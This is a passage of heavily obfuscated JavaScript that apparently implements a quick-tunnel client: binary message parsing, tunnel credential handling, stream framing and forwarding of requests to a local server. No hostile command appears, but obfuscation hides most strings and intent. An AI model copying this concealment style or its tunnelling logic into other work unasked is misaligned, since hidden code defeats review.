        throw new Error(c[g5(0x83f)]);
    const d = a[b];
    if (c[g5(0xb27)](c[g5(0x9b7)](d, 0x3n), 0x0n))
        throw new Error(c[g5(0x412)]);
    let f = c[g5(0x9b7)](d >> 0x2n, 0x3fffffffn);
    c[g5(0x83e)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = b + 0x1 + c[g5(0x851)](Number, f), h = c[g5(0x87d)](Number, c[g5(0x34c)](c[g5(0x3f0)](d, 0x20n), 0xffffn)), i = c[g5(0x87d)](Number, c[g5(0x3f0)](d, 0x30n) & 0xffffn);
    if (c['qNctb'](g, 0x0) || c['rvLCg'](c[g5(0xb2b)](g, h), i) > a['length'])
        throw new Error(g5(0x304));
    return [
        g,
        h,
        i
    ];
}
function a0aG(a) {
    const g6 = a0cm, b = {
            'XDMpi': function (d, f) {
                return d <= f;
            },
            'AfaPq': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[g6(0x811)](b[g6(0x51a)](d, 0x8), a[g6(0x55c)]); d += 0x8) {
        c[g6(0x1d5)](a['readBigUInt64LE'](d));
    }
    return c;
}
function a0aH(a, b) {
    const g7 = a0cm, c = {
            'cPsOi': function (p, q) {
                return p !== q;
            },
            'APZjk': function (p, q) {
                return p & q;
            },
            'fVNbA': function (p, q) {
                return p !== q;
            },
            'ZZnhV': function (p, q) {
                return p & q;
            },
            'DqVrD': function (p, q) {
                return p & q;
            },
            'IWtVU': function (p, q) {
                return p + q;
            },
            'nYWTK': function (p, q) {
                return p >> q;
            },
            'menqP': function (p, q) {
                return p < q;
            },
            'lvKhJ': function (p, q) {
                return p >= q;
            },
            'FqsuW': function (p, q) {
                return p >> q;
            },
            'TfLrf': function (p, q) {
                return p(q);
            },
            'hGRbM': function (p, q) {
                return p < q;
            },
            'DFLoP': function (p, q) {
                return p === q;
            },
            'Kplcb': function (p, q) {
                return p * q;
            },
            'OwsCz': function (p, q) {
                return p > q;
            },
            'iSQdJ': function (p, q) {
                return p + q;
            },
            'lcYtO': function (p, q) {
                return p < q;
            },
            'IfttE': function (p, q) {
                return p + q;
            },
            'THGcS': function (p, q) {
                return p + q;
            },
            'dJBEB': function (p, q) {
                return p * q;
            },
            'GHZWc': function (p, q, r) {
                return p(q, r);
            },
            'nrLSV': function (p, q, r) {
                return p(q, r);
            }
        };
    if (b >= a[g7(0x55c)])
        return null;
    const d = a[b];
    if (c[g7(0x38c)](c[g7(0xc78)](d, 0x3n), 0x1n) || c[g7(0x4f5)](c[g7(0xcc7)](d >> 0x20n, 0x7n), 0x7n))
        return null;
    let f = c[g7(0x8ef)](d >> 0x2n, 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c['IWtVU'](c['IWtVU'](b, 0x1), Number(f)), h = Number(c[g7(0xb42)](d, 0x23n));
    if (c[g7(0x626)](g, 0x0) || c[g7(0xa51)](g, a[g7(0x55c)]))
        return null;
    const j = a[g];
    if (c['DqVrD'](j, 0x3n) !== 0x0n)
        return null;
    const k = Number(c[g7(0xcc7)](c['FqsuW'](j, 0x20n), 0xffffn)), l = c[g7(0xb4d)](Number, c[g7(0xcc7)](c[g7(0xb42)](j, 0x30n), 0xffffn)), m = c['TfLrf'](Number, j >> 0x2n & 0x3fffffffn), n = k + l;
    if (c['hGRbM'](l, 0x2) || c[g7(0x51e)](n, 0x0) || c[g7(0x283)](n, m) !== h)
        return null;
    if (c[g7(0x122)](c[g7(0xd8c)](c[g7(0xb48)](g, 0x1), c['Kplcb'](n, m)), a[g7(0x55c)]))
        return null;
    const o = [];
    for (let p = 0x0; c[g7(0x813)](p, m); p++) {
        const q = c[g7(0x7a7)](c[g7(0xc2a)](g, 0x1), c[g7(0x751)](p, n));
        o[g7(0x1d5)]([
            c[g7(0xaed)](a0aI, a, c['IWtVU'](q, k)),
            c[g7(0xcc1)](a0aI, a, c[g7(0xc2a)](q + k, 0x1))
        ]);
    }
    return o;
}
function a0aI(a, b) {
    const g8 = a0cm, c = {
            'KSlBL': function (m, n) {
                return m >= n;
            },
            'fftsa': function (m, n) {
                return m !== n;
            },
            'gxdMZ': function (m, n) {
                return m & n;
            },
            'bTSSy': function (m, n) {
                return m + n;
            },
            'hYUwV': function (m, n) {
                return m(n);
            },
            'zrgnc': function (m, n) {
                return m >> n;
            },
            'TtfaY': function (m, n) {
                return m !== n;
            },
            'FivtH': function (m, n) {
                return m < n;
            },
            'jvAgd': function (m, n) {
                return m * n;
            },
            'YGvac': function (m, n) {
                return m & n;
            },
            'fEmBQ': function (m, n) {
                return m * n;
            },
            'MOSML': g8(0x7d9)
        };
    if (c[g8(0x956)](b, a['length']))
        return '';
    const d = a[b];
    if (c[g8(0xd0c)](d & 0x3n, 0x1n))
        return '';
    let f = c[g8(0x3a8)](d >> 0x2n, 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[g8(0x699)](c[g8(0x699)](b, 0x1), c[g8(0xc5c)](Number, f)), h = c['hYUwV'](Number, c[g8(0xd74)](d, 0x20n) & 0x7n), j = Number(c['zrgnc'](d, 0x23n)), k = Math['ceil'](j / 0x8);
    if (c[g8(0xb25)](h, 0x2) || c[g8(0x5e5)](g, 0x0) || g + k > a[g8(0x55c)])
        return '';
    const l = Buffer[g8(0x2d9)](c[g8(0x2ab)](k, 0x8));
    for (let m = 0x0; c[g8(0x5e5)](m, k); m++) {
        l[g8(0x1ee)](c[g8(0xa5b)](a[c[g8(0x699)](g, m)], 0xffffffffffffffffn), c[g8(0x6e2)](m, 0x8));
    }
    return l[g8(0x262)](0x0, j)['toString'](c[g8(0xcd0)])[g8(0x3a0)](/\0+$/, '');
}
function a0aJ(a) {
    const g9 = a0cm, b = {
            'dTETl': function (u, v) {
                return u % v;
            },
            'kKHaV': function (u, v) {
                return u < v;
            },
            'LOSRp': function (u, v) {
                return u(v);
            },
            'xllFE': function (u, v, w) {
                return u(v, w);
            },
            'yVSpp': function (u, v) {
                return u < v;
            },
            'mCGHk': g9(0x5c9),
            'SLoJr': function (u, v) {
                return u + v;
            },
            'WqknA': function (u, v) {
                return u & v;
            },
            'fLZik': function (u, v) {
                return u >> v;
            },
            'QVrSo': function (u, v) {
                return u + v;
            },
            'wOJCj': function (u, v) {
                return u + v;
            },
            'VFTbT': g9(0x513),
            'VWFOH': function (u, v) {
                return u !== v;
            },
            'XhPUN': g9(0x853),
            'WRhUd': function (u, v) {
                return u + v;
            },
            'KPkuz': function (u, v) {
                return u + v;
            },
            'BjmUR': function (u, v) {
                return u === v;
            },
            'qEeNT': function (u, v) {
                return u & v;
            },
            'DFgoe': function (u, v) {
                return u + v;
            },
            'NGVlz': function (u, v) {
                return u === v;
            },
            'NNaPt': function (u, v) {
                return u + v;
            },
            'xNhoR': function (u, v) {
                return u === v;
            },
            'DJOkB': function (u, v, w) {
                return u(v, w);
            },
            'jNCKf': function (u, v) {
                return u + v;
            },
            'kPSMM': function (u, v, w) {
                return u(v, w);
            },
            'oTsav': function (u, v) {
                return u + v;
            },
            'CXFpo': function (u, v, w) {
                return u(v, w);
            },
            'xCgLb': function (u, v) {
                return u || v;
            }
        };
    if (b[g9(0x628)](a[g9(0x55c)], 0x8) || b[g9(0x2ef)](a[g9(0x55c)], 0x10))
        throw new Error(g9(0x7be));
    const c = b['LOSRp'](a0aG, a);
    let d, f, g;
    [d, f, g] = b[g9(0x87b)](a0aF, c, 0x0);
    if (b[g9(0x13a)](f, 0x1) || (c[d] & 0xffffn) !== 0x3n)
        throw new Error(b['mCGHk']);
    const [h, i, j] = a0aF(c, b[g9(0x14b)](d, f)), k = b['LOSRp'](Number, b[g9(0xa80)](b[g9(0x2ff)](c[h], 0x30n), 0xffffn));
    if (k === 0x4) {
        const [u, v] = b['xllFE'](a0aF, c, b[g9(0xafa)](h, i));
        return {
            'ok': ![],
            'error': a0aI(c, b[g9(0x746)](u, v)) || b['VFTbT']
        };
    }
    if (b[g9(0xcb8)](k, 0x0))
        return {
            'ok': ![],
            'error': b['SLoJr'](b[g9(0xb98)], k)
        };
    const [l, m, n] = a0aF(c, b[g9(0xb50)](h, i));
    if (!n)
        return {
            'ok': ![],
            'error': g9(0xee)
        };
    const o = c[b[g9(0xced)](l, m)];
    if (b[g9(0x1d8)](b[g9(0x607)](o, 0x3n), 0x3n))
        return {
            'ok': ![],
            'bootstrap': !![]
        };
    let p, q, r;
    [p, q, r] = b['xllFE'](a0aF, c, b['DFgoe'](l, m));
    b['BjmUR'](q, 0x0) && b['NGVlz'](r, 0x1) && ([p, q, r] = a0aF(c, b['NNaPt'](p, q)));
    const s = q > 0x0 ? Number(b[g9(0x607)](c[p], 0xffffn)) : 0x0;
    if (b[g9(0xb20)](s, 0x1)) {
        const [w, x] = b[g9(0x1ed)](a0aF, c, b['jNCKf'](p, q)), y = b[g9(0xbca)](a0aI, c, b[g9(0x969)](b[g9(0x82f)](w, x), 0x1));
        return {
            'ok': !![],
            'location': y
        };
    }
    const t = b[g9(0x2f7)](a0aI, c, p + q);
    return {
        'ok': ![],
        'error': b[g9(0x8d7)](t, b[g9(0x194)])
    };
}
function a0aK(a) {
    const ga = a0cm, b = {
            'SaimU': function (h, i) {
                return h(i);
            },
            'zuTso': ga(0x77f),
            'kYUWs': function (h, i, j) {
                return h(i, j);
            },
            'VHEoH': function (h, i) {
                return h < i;
            },
            'OjtEK': function (h, i) {
                return h < i;
            },
            'tuUpl': ga(0x477),
            'ijMBR': function (h, i, j) {
                return h(i, j);
            },
            'qndzd': function (h, i) {
                return h + i;
            },
            'aCLAc': function (h, i) {
                return h(i);
            },
            'xWdEZ': function (h, i) {
                return h & i;
            },
            'QMyqs': function (h, i) {
                return h + i;
            }
        }, c = b[ga(0xc1a)](a0aG, a);
    if (!c[ga(0x55c)])
        throw new Error(b[ga(0x261)]);
    let d, f, g;
    [d, f, g] = b['kYUWs'](a0aF, c, 0x0);
    if (b[ga(0x1bf)](f, 0x1) || b[ga(0x74d)](g, 0x2))
        throw new Error(b['tuUpl']);
    return {
        'dest': b['ijMBR'](a0aI, c, b[ga(0x5e8)](d, f)),
        'type': b[ga(0xa40)](Number, b[ga(0x97d)](c[d], 0xffffn)),
        'metadata': a0aH(c, b[ga(0x411)](b[ga(0x5e8)](d, f), 0x1)) || []
    };
}
function a0aL(a, b) {
    const gb = a0cm, c = {
            'AnofC': function (h, i) {
                return h + i;
            },
            'yqZcy': function (h, i) {
                return h || i;
            },
            'GGmPm': function (h, i) {
                return h + i;
            }
        }, d = new a0aB(), f = d[gb(0x2d9)](0x1), g = d['alloc'](0x2);
    return d[gb(0x50f)](f, g, 0x0, 0x2), d['writeBytes'](g, c[gb(0x945)](a, ''), !![]), d[gb(0x818)](c[gb(0x9fe)](g, 0x1), b[gb(0x55c)], 0x0, 0x2, (h, i) => {
        const gc = gb;
        d[gc(0xda5)](i, b[h][0x0], !![]), d['writeBytes'](c[gc(0x72b)](i, 0x1), b[h][0x1], !![]);
    }), d['finish']();
}
const a0aM = {
    '.js': 'text/javascript;\x20charset=utf-8',
    '.mjs': 'text/javascript;\x20charset=utf-8',
    '.css': a0cm(0x19f),
    '.json': a0cm(0x450),
    '.map': 'application/json;\x20charset=utf-8',
    '.wasm': a0cm(0x5e7),
    '.html': a0cm(0xc0e),
    '.htm': a0cm(0xc0e),
    '.svg': a0cm(0xb69),
    '.xml': 'application/xml',
    '.woff': a0cm(0x8c7),
    '.woff2': 'font/woff2',
    '.png': a0cm(0x46f),
    '.jpg': a0cm(0xc0a),
    '.jpeg': a0cm(0xc0a),
    '.gif': a0cm(0x31b),
    '.ico': 'image/x-icon'
};
function a0aN(a) {
    const gd = a0cm, b = {
            'sLhlk': function (f, g) {
                return f < g;
            }
        }, c = a[gd(0xb13)]('/') ? a[gd(0x2d5)](0x0, -0x1) : a, d = c['lastIndexOf']('.');
    if (b[gd(0x29a)](d, 0x0))
        return '';
    return a0aM[c[gd(0x2d5)](d)[gd(0x426)]()] || '';
}
function a0aO(a) {
    const ge = a0cm, b = {
            'pbYdr': function (c, d) {
                return c !== d;
            },
            'LzNal': ge(0x12a),
            'gZixT': 'quick\x20tunnel\x20secret\x20has\x20an\x20unexpected\x20type',
            'ApQbG': function (c, d) {
                return c + d;
            }
        };
    if (Array[ge(0xcb3)](a))
        return Buffer[ge(0x1e7)](a);
    if (b[ge(0x999)](typeof a, b['LzNal']))
        throw new Error(b[ge(0xcff)]);
    return Buffer['from'](b[ge(0x827)](a, '='[ge(0x3ba)](-a[ge(0x55c)] % 0x4)), ge(0x5bd));
}
const a0aP = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0aQ(a) {
    const gf = a0cm, b = {
            'xvVeC': function (c, d) {
                return c + d;
            },
            'unzoP': 'quick\x20tunnel\x20returned\x20non-JSON\x20(',
            'oPwLw': gf(0x37b),
            'uELNP': gf(0x7d9),
            'Emlqd': function (c, d) {
                return c(d);
            },
            'cMvhK': gf(0x476),
            'rHrvN': function (c, d) {
                return c !== d;
            },
            'cqDMY': function (c, d) {
                return c !== d;
            },
            'byXfw': gf(0x12a),
            'TqLZX': gf(0x414),
            'AZTBt': gf(0xc10),
            'QrLob': gf(0x5f8),
            'RosWM': gf(0xaa0),
            'plwiS': 'end',
            'jLSMD': function (c, d) {
                return c(d);
            },
            'MRfYB': function (c, d) {
                return c === d;
            },
            'ademr': gf(0x940),
            'VcXlJ': gf(0xd69),
            'aNdSU': gf(0xc81)
        };
    return new Promise((c, d) => {
        const gg = gf;
        let f;
        try {
            f = new URL(a[gg(0x3a0)](/\/+$/, '') + gg(0xb95));
        } catch (i) {
            b['jLSMD'](d, new Error(b[gg(0x2c9)](gg(0xad2), i[gg(0xbe8)])));
            return;
        }
        const g = b['MRfYB'](f[gg(0x56f)], b[gg(0xc13)]) ? a0h : a0g, h = g[gg(0x16e)](f, {
                'method': b[gg(0x546)],
                'headers': {
                    'Content-Type': b[gg(0x9eb)],
                    'User-Agent': gg(0x732)
                },
                'timeout': 0x3a98
            }, j => {
                const gh = gg, k = {
                        'JaFQd': function (m, n) {
                            return b['xvVeC'](m, n);
                        },
                        'qzWhQ': b[gh(0x5e3)],
                        'ZfdtP': b['oPwLw'],
                        'VNjYV': b['uELNP'],
                        'icITq': function (m, n) {
                            const gi = gh;
                            return b[gi(0x377)](m, n);
                        },
                        'qnZtX': function (m, n) {
                            const gj = gh;
                            return b[gj(0x2c9)](m, n);
                        },
                        'GZScV': b['cMvhK'],
                        'EiVVa': gh(0x4b4),
                        'tPnZu': function (m, n) {
                            const gk = gh;
                            return b[gk(0x2a1)](m, n);
                        },
                        'XrIuP': function (m, n) {
                            const gl = gh;
                            return b[gl(0x797)](m, n);
                        },
                        'VqLiE': b['byXfw'],
                        'ZPuQb': b[gh(0xb38)],
                        'IgtfE': function (m, n) {
                            const gm = gh;
                            return b[gm(0x2c9)](m, n);
                        },
                        'zgxfr': b[gh(0xb0e)]
                    }, l = [];
                j['on'](b[gh(0x56a)], m => l[gh(0x1d5)](m)), j['on'](b['RosWM'], d), j['on'](b['plwiS'], () => {
                    const gn = gh, m = Buffer['concat'](l), n = j['statusCode'];
                    let o;
                    try {
                        o = JSON[gn(0x881)](m[gn(0x7a0)](gn(0x7d9)));
                    } catch (q) {
                        d(new Error(k[gn(0x2af)](k['qzWhQ'] + n + k[gn(0x950)], m['subarray'](0x0, 0x12c)[gn(0x7a0)](k[gn(0xc68)]))));
                        return;
                    }
                    const p = o[gn(0xa18)] || {};
                    if (!(o[gn(0xcef)] ?? !![]) || !p) {
                        k[gn(0x5cd)](d, new Error(k[gn(0x4d0)](k[gn(0x668)], JSON[gn(0xd94)](o[gn(0x900)]))));
                        return;
                    }
                    try {
                        const r = k[gn(0x5cd)](String, p['id']);
                        if (!a0aP['test'](r))
                            throw new Error(k[gn(0x87e)]);
                        if (k['tPnZu'](typeof p[gn(0x4e7)], 'string') || k['XrIuP'](typeof p[gn(0xc18)], k[gn(0x166)]))
                            throw new Error(k['ZPuQb']);
                        const s = k[gn(0x5cd)](a0aO, p[gn(0xd36)]), t = Buffer['from'](r['replace'](/-/g, ''), gn(0x47c));
                        k[gn(0x5cd)](c, [
                            p[gn(0xc18)],
                            p[gn(0x4e7)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        k[gn(0x5cd)](d, new Error(k['IgtfE'](k[gn(0x97c)], u[gn(0xbe8)])));
                    }
                });
            });
        h['on'](b[gg(0x533)], j => d(new Error(gg(0xad2) + j[gg(0xbe8)]))), h['end']();
    });
}
function a0aR(a) {
    const go = a0cm;
    return a[go(0x8a0)](([b, c]) => Buffer[go(0x1e7)](b, go(0x7d9))[go(0x7a0)]('base64')[go(0x3a0)](/=+$/, '') + ':' + Buffer['from'](c, go(0x7d9))['toString'](go(0x5bd))[go(0x3a0)](/=+$/, ''))[go(0x455)](';');
}
class a0aS {
    constructor(a) {
        const gp = a0cm, b = {
                'GrJwp': gp(0x825),
                'ugAXu': gp(0x5f8),
                'RdTGd': 'error',
                'enfzI': gp(0x7bc)
            }, c = b[gp(0xa48)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a['on'](b[gp(0x28b)], f => {
                    const gq = gp;
                    this['buffer'] = this[gq(0x93f)][gq(0x55c)] ? Buffer[gq(0x5f9)]([
                        this['buffer'],
                        f
                    ]) : f, this[gq(0xbf8)]();
                });
                continue;
            case '1':
                a['on'](gp(0x536), () => {
                    const gr = gp;
                    this[gr(0x874)] = !![], this[gr(0xbf8)]();
                });
                continue;
            case '2':
                this['waiters'] = [];
                continue;
            case '3':
                a['on'](b[gp(0x35c)], f => {
                    const gs = gp;
                    this[gs(0x8d8)] = f, this[gs(0xbf8)]();
                });
                continue;
            case '4':
                a['on'](b[gp(0x946)], () => {
                    const gt = gp;
                    this[gt(0x874)] = !![], this[gt(0xbf8)]();
                });
                continue;
            case '5':
                this['errored'] = null;
                continue;
            case '6':
                this[gp(0xa05)] = a;
                continue;
            case '7':
                this[gp(0x93f)] = Buffer['alloc'](0x0);
                continue;
            case '8':
                this[gp(0x874)] = ![];
                continue;
            }
            break;
        }
    }
    [a0cm(0xbf8)]() {
        const gu = a0cm, a = {
                'LhMPv': function (b, c) {
                    return b > c;
                },
                'TkIAm': function (b, c) {
                    return b !== c;
                },
                'qZkBV': 'connection\x20closed'
            };
        while (a[gu(0x41b)](this[gu(0x5de)][gu(0x55c)], 0x0)) {
            const b = this['waiters'][0x0];
            if (this[gu(0x93f)][gu(0x55c)] >= b[gu(0xbeb)]) {
                this['waiters'][gu(0x3b0)]();
                const c = this['buffer'][gu(0x262)](0x0, b[gu(0xbeb)]);
                this[gu(0x93f)] = this[gu(0x93f)][gu(0x262)](b[gu(0xbeb)]), b['resolve'](c);
            } else {
                if (a[gu(0x431)](this[gu(0x8d8)], null))
                    this[gu(0x5de)][gu(0x3b0)](), b['reject'](this['errored']);
                else {
                    if (this[gu(0x874)])
                        this[gu(0x5de)][gu(0x3b0)](), b['reject'](new Error(a[gu(0x38d)]));
                    else
                        break;
                }
            }
        }
    }
    [a0cm(0xd34)](a) {
        const gv = a0cm, b = {
                'wKEKb': function (c, d) {
                    return c >= d;
                },
                'nPguU': gv(0x5c5)
            };
        if (this[gv(0x8d8)] !== null)
            return Promise['reject'](this[gv(0x8d8)]);
        if (b[gv(0x33c)](this[gv(0x93f)][gv(0x55c)], a)) {
            const c = this['buffer'][gv(0x262)](0x0, a);
            return this[gv(0x93f)] = this[gv(0x93f)][gv(0x262)](a), Promise[gv(0x48d)](c);
        }
        if (this[gv(0x874)])
            return Promise['reject'](new Error(b['nPguU']));
        return new Promise((d, f) => {
            const gw = gv;
            this[gw(0x5de)][gw(0x1d5)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[gw(0xbf8)]();
        });
    }
}
class a0aT {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const gx = a0cm, l = { 'zBecl': gx(0x355) }, m = l[gx(0xd78)][gx(0xb0c)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this['tunnelSecret'] = d;
                continue;
            case '1':
                this[gx(0xb8c)] = j;
                continue;
            case '2':
                this[gx(0xcb6)] = i;
                continue;
            case '3':
                this[gx(0x698)] = ![];
                continue;
            case '4':
                this[gx(0x10f)] = null;
                continue;
            case '5':
                this[gx(0x953)] = g;
                continue;
            case '6':
                this[gx(0xcac)] = [];
                continue;
            case '7':
                this['accountTag'] = c;
                continue;
            case '8':
                this[gx(0x8cb)] = ![];
                continue;
            case '9':
                this[gx(0xd71)] = a0ao;
                continue;
            case '10':
                this[gx(0x95a)] = b;
                continue;
            case '11':
                this[gx(0x305)] = h;
                continue;
            case '12':
                this[gx(0x907)] = new Map();
                continue;
            case '13':
                this['tunnelId'] = f;
                continue;
            case '14':
                this[gx(0x4e3)] = a;
                continue;
            case '15':
                this['streamWindows'] = new Map();
                continue;
            case '16':
                this['connectionWindow'] = 0xffff;
                continue;
            case '17':
                this['reader'] = new a0aS(a);
                continue;
            case '18':
                this[gx(0x691)] = ![];
                continue;
            case '19':
                this['tunnelState'] = k || { 'printed': ![] };
                continue;
            case '20':
                this[gx(0x64f)] = new a0ax();
                continue;
            }
            break;
        }
    }
    [a0cm(0x5ad)](a, b, c, d = Buffer['alloc'](0x0)) {
        const gy = a0cm, f = {
                'nmnwX': function (h, i) {
                    return h > i;
                },
                'UUyJV': gy(0x458),
                'CTfSU': function (h, i) {
                    return h & i;
                }
            };
        if (f[gy(0xe7)](d[gy(0x55c)], 0xffffff))
            throw new Error(f['UUyJV']);
        const g = Buffer[gy(0x2d9)](0x9);
        g[gy(0xbe4)](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[gy(0xcf6)](f[gy(0x36f)](c, 0x7fffffff), 0x5), this[gy(0x4e3)][gy(0x10b)](Buffer[gy(0x5f9)]([
            g,
            d
        ]));
    }
    [a0cm(0x778)](a, b, c = ![]) {
        const gz = a0cm, d = {
                'gxrHN': function (h, i) {
                    return h | i;
                }
            }, f = a0aA(b), g = d[gz(0xb2a)](0x4, c ? 0x1 : 0x0);
        this[gz(0x5ad)](0x1, g, a, f);
    }
    [a0cm(0x301)](a) {
        const gA = a0cm, b = {
                'njIQc': function (c, d) {
                    return c > d;
                }
            };
        if (this[gA(0x6b3)] > 0x0 && b[gA(0x72a)](this[gA(0x9c1)][gA(0x81a)](a) ?? 0xffff, 0x0))
            return Promise[gA(0x48d)]();
        return new Promise(c => {
            const gB = gA;
            this[gB(0xcac)][gB(0x1d5)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0cm(0x4aa)]() {
        const gC = a0cm, a = [];
        for (const b of this['windowWaiters']) {
            const c = this[gC(0x9c1)][gC(0x81a)](b['streamId']) ?? 0xffff;
            this[gC(0x6b3)] > 0x0 && c > 0x0 ? b['resolve']() : a['push'](b);
        }
        this['windowWaiters'] = a;
    }
    [a0cm(0x168)]() {
        const gD = a0cm;
        for (const a of this[gD(0xcac)]) {
            a['resolve']();
        }
        this[gD(0xcac)] = [];
    }
    async [a0cm(0x8e1)](a, b, c = ![]) {
        const gE = a0cm, d = {
                'zDffp': function (h, i) {
                    return h - i;
                },
                'jGlnk': function (h, i) {
                    return h >= i;
                },
                'PqKja': function (h, i) {
                    return h + i;
                },
                'cmuIa': function (h, i) {
                    return h < i;
                }
            }, f = b['length'];
        let g = 0x0;
        do {
            await this[gE(0x301)](a);
            if (this['stopped'])
                return;
            const h = this[gE(0x9c1)][gE(0x81a)](a) ?? 0xffff, i = Math[gE(0x389)](d[gE(0x636)](f, g), this[gE(0x6b3)], h, this[gE(0xd71)]), j = c && d[gE(0x665)](d[gE(0x78d)](g, i), f) ? 0x1 : 0x0, k = b[gE(0x262)](g, d[gE(0x78d)](g, i));
            this[gE(0x6b3)] -= i, this[gE(0x9c1)][gE(0x689)](a, h - i), this[gE(0x5ad)](0x0, j, a, k), g += i;
        } while (d[gE(0x370)](g, f));
    }
    [a0cm(0x21e)](a, b) {
        const gF = a0cm, c = {
                'IUHYE': function (d, f) {
                    return d > f;
                }
            };
        if (c[gF(0xc5e)](b, 0x0)) {
            const d = Buffer[gF(0x2d9)](0x4);
            d[gF(0xcf6)](b & 0x7fffffff, 0x0), this[gF(0x5ad)](0x8, 0x0, a, d);
        }
    }
    async [a0cm(0xb40)]() {
        const gG = a0cm, a = await this[gG(0x1c3)][gG(0xd34)](0x9), b = a[gG(0x268)](0x0, 0x3), c = a[0x3], d = a[0x4], f = a[gG(0xbfa)](0x5) & 0x7fffffff, g = await this[gG(0x1c3)][gG(0xd34)](b);
        return [
            c,
            d,
            f,
            g
        ];
    }
    async [a0cm(0x2bb)](a, b, c) {
        const gH = a0cm, d = {
                'SqELh': function (g, h) {
                    return g & h;
                },
                'ReePP': function (g, h) {
                    return g > h;
                },
                'SLReI': gH(0x1ef),
                'GnVSw': function (g, h) {
                    return g - h;
                },
                'YLAoc': function (g, h) {
                    return g & h;
                },
                'OIahg': function (g, h) {
                    return g !== h;
                },
                'WjTHf': gH(0x59e)
            };
        if (d['SqELh'](a, 0x8)) {
            const g = c[0x0];
            c = c[gH(0x262)](0x1);
            if (d[gH(0xb4b)](g, c[gH(0x55c)]))
                throw new Error(d[gH(0x461)]);
            c = g ? c[gH(0x262)](0x0, d['GnVSw'](c[gH(0x55c)], g)) : c;
        }
        d['YLAoc'](a, 0x20) && (c = c[gH(0x262)](0x5));
        const f = [c];
        while (!d[gH(0x70f)](a, 0x4)) {
            const h = await this[gH(0xb40)]();
            if (d['OIahg'](h[0x0], 0x9) || h[0x2] !== b)
                throw new Error(d['WjTHf']);
            f[gH(0x1d5)](h[0x3]), a = h[0x1];
        }
        return this[gH(0x64f)]['decode'](Buffer[gH(0x5f9)](f));
    }
    [a0cm(0x4b9)](a) {
        const gI = a0cm, b = {
                'pscvB': function (c, d) {
                    return c !== d;
                },
                'PChdH': ':status',
                'XfKsb': gI(0x8ac)
            };
        if (b[gI(0xcde)](this[gI(0x10f)], null))
            return;
        this['control'] = new a0aV(this, a, this[gI(0x305)]), this[gI(0x778)](a, [[
                b[gI(0x121)],
                b[gI(0x334)]
            ]]), this[gI(0x10f)][gI(0xae2)](this[gI(0x120)], this[gI(0xaff)], this[gI(0x6a1)], this[gI(0x953)]);
    }
    [a0cm(0x46d)](a, b) {
        const gJ = a0cm, c = {
                'jBtjg': gJ(0x7d9),
                'bukaE': function (g, h, i) {
                    return g(h, i);
                },
                'QtKQz': gJ(0x7a3),
                'RYDIy': gJ(0xc81),
                'wuIJk': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[gJ(0x881)](b['length'] ? b[gJ(0x7a0)](c[gJ(0xaee)]) : '{}'), h = c[gJ(0xc05)](parseInt, g[gJ(0xa49)], 0xa);
            !Number[gJ(0x30a)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[gJ(0x1e7)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[gJ(0x778)](a, [
            [
                c['QtKQz'],
                gJ(0x8ac)
            ],
            [
                gJ(0x9bd),
                c[gJ(0x550)]
            ],
            [
                'content-length',
                c['wuIJk'](String, f[gJ(0x55c)])
            ]
        ]), this[gJ(0x8e1)](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const gK = a0cm, c = {
                'iQrEs': gK(0x5d3),
                'NQkWa': function (g, h) {
                    return g === h;
                },
                'eCJNh': gK(0x15d)
            }, d = c[gK(0x299)]['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (b[gK(0xc50)])
                    return;
                continue;
            case '1':
                this[gK(0x9fc)](a, b)[gK(0xd7b)](() => {
                });
                continue;
            case '2':
                b[gK(0xc50)] = !![];
                continue;
            case '3':
                if (c[gK(0x561)](b['upgrade'], c['eCJNh'])) {
                    this[gK(0x46d)](a, Buffer[gK(0x5f9)](b[gK(0x341)]));
                    return;
                }
                continue;
            case '4':
                if (b['websocket'])
                    return;
                continue;
            }
            break;
        }
    }
    async [a0cm(0x9fc)](a, b) {
        const gL = a0cm, c = {
                'ljisE': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'zfNcD': function (d, f) {
                    return d === f;
                },
                'dkVhh': gL(0x5be),
                'mhcQp': gL(0x860),
                'eHSLc': gL(0x39f),
                'ndvEK': gL(0xb5e),
                'iPdCo': function (d, f) {
                    return d(f);
                },
                'CemZw': gL(0x9bd),
                'ZIzJl': gL(0x7a3),
                'qvZuP': gL(0x6d6),
                'oSqeB': gL(0x7b8),
                'nwqrO': function (d, f) {
                    return d + f;
                },
                'knWbF': function (d, f) {
                    return d + f;
                },
                'oUMxL': gL(0x9b9),
                'zcidK': gL(0xb24)
            };
        try {
            const d = await c[gL(0xd8d)](a0aY, this[gL(0x95a)], b[gL(0x394)], b[gL(0xa3d)], b[gL(0x258)], Buffer['concat'](b[gL(0x341)])), f = [], g = [];
            for (const [k, l] of d[gL(0x258)]) {
                const m = k[gL(0x426)]();
                c[gL(0x664)](m, c[gL(0x205)]) && g[gL(0x1d5)]([
                    m,
                    l
                ]);
                const n = m[gL(0x830)](gL(0xbe5)) || m['startsWith'](c[gL(0x973)]) || m[gL(0x830)](c[gL(0x7ec)]) || m[gL(0x830)](':');
                (!n || c[gL(0x664)](m, c[gL(0xda6)]) || m === gL(0xb0f) || m === gL(0xb14)) && f[gL(0x1d5)]([
                    m,
                    l
                ]);
            }
            if (!f[gL(0x758)](([o]) => o === gL(0x9bd))) {
                const o = c[gL(0x131)](a0aN, b[gL(0xa3d)]);
                o && f[gL(0x1d5)]([
                    c[gL(0x47d)],
